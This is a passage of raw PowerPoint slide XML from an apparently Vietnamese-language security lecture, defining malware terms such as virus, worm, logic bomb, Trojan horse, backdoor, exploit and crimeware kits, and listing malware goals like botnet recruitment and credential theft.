              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>hệ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>thống</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>thành</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> zombie agent </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>hoặc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> botnet</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2" algn="just">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Đánh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>cắp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>thông</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> tin </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>từ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>hệ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>thống</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>thông</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> tin </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>đăng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>nhập</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>mật</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>khẩu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>hoặc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>các</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>dữ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>liệu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>cá</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>nhân</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>bằng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>ghi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>chép</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>bàn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>phím</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>hoặc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>các</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>ch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2200" dirty="0"/>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>ơng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>trình</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>gián</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>điệp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2" algn="just">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Ẩn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>giấu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>sự</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>hiện</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>diện</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>trên</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>hệ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>thống</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>khỏi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>việc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>bị</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>phát</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>hiện</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> hay block</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1028700" lvl="3" indent="-342900">
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2200" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="1" indent="0" algn="just">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="5355659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375313" y="304800"/>
            <a:ext cx="8911687" cy="982268"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US" sz="4000" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US" sz="4000" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US" sz="4000" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Thuật ng</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ữ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Content Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1447800"/>
            <a:ext cx="9601200" cy="4189514"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Virus: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>gắn mình vào một chương trình và </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>tạo</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ra</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>bản sao của chính nó đến các chương trình khác</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="24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altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Worm: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>chương trình </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>tạo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ra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truyền</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="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bản sao của chính nó đến các máy tính khác</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="24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Logic bomb: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Đoạn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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ơng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trình</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> đ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ợc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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ích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hoạt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một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điều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đặt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trước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xảy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ra</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="24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Trojan horse: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Chương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trình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chứa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những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chức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năng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mong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đợi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">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Backdoor: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ho </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>phép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truy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cập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trái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phép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chức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năng</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="24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Payload: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Hoạt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động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của</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> malware </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>đối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với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mục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tiêu</a:t>
            </a:r>
            <a:endParaRPr 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Exploit: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Đoạn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mã</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chuyên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biệt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một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lỗ</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hổng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hoặc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một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tập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lỗ</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hổng</a:t>
            </a:r>
            <a:endParaRPr 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b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Crimeware</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>bộ dụng cụ để xây dựng phần mềm độc hại; bao gồm các cơ chế </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>lan</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> truyền và </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>payload. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Ví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dụ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Zeus, Sakura, Blackhole, Phoenix</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">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1034923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601262" y="381000"/>
            <a:ext cx="8911687" cy="982268"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Thuật ng</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ữ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Content Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1524000"/>
            <a:ext cx="10895012" cy="4189514"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Auto-rooter Kit (virus generator): </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Bộ công cụ để tạo ra các virus mới tự động</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2400" b="1"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Spammer and flooder programs (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>DoS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
